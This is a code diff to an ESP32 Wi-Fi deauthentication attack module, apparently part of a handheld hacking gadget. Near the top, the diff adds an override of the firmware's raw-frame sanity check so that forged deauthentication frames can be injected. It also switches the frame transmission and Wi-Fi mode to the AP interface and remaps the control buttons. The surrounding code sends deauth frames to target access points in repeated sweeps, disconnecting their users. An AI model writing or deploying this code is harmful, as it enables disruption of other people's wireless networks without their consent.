@@ -3,13 +3,15 @@
 #include <WiFi.h>
 #include "wifideauth.h"
 #include "esp_wifi.h"
+#include "pindefs.h"
+
+// Disable frame sanity checks
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+    return 0;  // Bypass the raw frame sanity check
+}
 
 // Shared display instance from main
 extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
-
-// Button definitions
-#define BUTTON_TOGGLE_PIN 26   // UP toggles deauth
-#define BUTTON_EXIT_PIN   27   // RIGHT exits to menu
 
 // Rate limit deauth sweeps
 static const unsigned long SWEEP_INTERVAL = 200; // ms
@@ -55,7 +57,7 @@ static void sendFrame(const uint8_t bssid[6], int channel) {
     memcpy(deauth_frame + 10, bssid,  6);
     memcpy(deauth_frame + 16, bssid,  6);
     for (int i = 0; i < 3; i++) {
-        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
+        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
         delay(0); // yield
     }
 }
@@ -86,7 +88,7 @@ void wifiDeauthSetup() {
     Serial.begin(115200);
 
     // Initialize Wi-Fi in AP_STA mode
-    WiFi.mode(WIFI_AP_STA);
+    WiFi.mode(WIFI_AP);
     delay(500);
     esp_wifi_set_promiscuous(true);
 
@@ -116,14 +118,14 @@ void wifiDeauthSetup() {
 
 bool wifiDeauthLoop() {
     Serial.print("DeauthLoop: toggle=");
-    Serial.print(digitalRead(BUTTON_TOGGLE_PIN));
+    Serial.print(digitalRead(BUTTON_PIN_UP));
     Serial.print("  exit=");
-    Serial.println(digitalRead(BUTTON_EXIT_PIN));
+    Serial.println(digitalRead(BUTTON_PIN_LEFT));
 
     unsigned long now = millis();
 
     // Handle toggle on UP button
-    if (digitalRead(BUTTON_TOGGLE_PIN) == LOW &&
+    if (digitalRead(BUTTON_PIN_UP) == LOW &&
         now - lastToggle > TOGGLE_DEBOUNCE) {
         deauthActive = !deauthActive;
         lastToggle = now;
@@ -145,10 +147,10 @@ bool wifiDeauthLoop() {
     }
     u8g2.sendBuffer();
 
-    // Exit on RIGHT button press
-    if (digitalRead(BUTTON_EXIT_PIN) == LOW) {
+    // Exit on left button press
+    if (digitalRead(BUTTON_PIN_LEFT) == LOW) {
         // Wait for release
-        while (digitalRead(BUTTON_EXIT_PIN) == LOW) {
+        while (digitalRead(BUTTON_PIN_LEFT) == LOW) {
             delay(10);
         }
         return true;
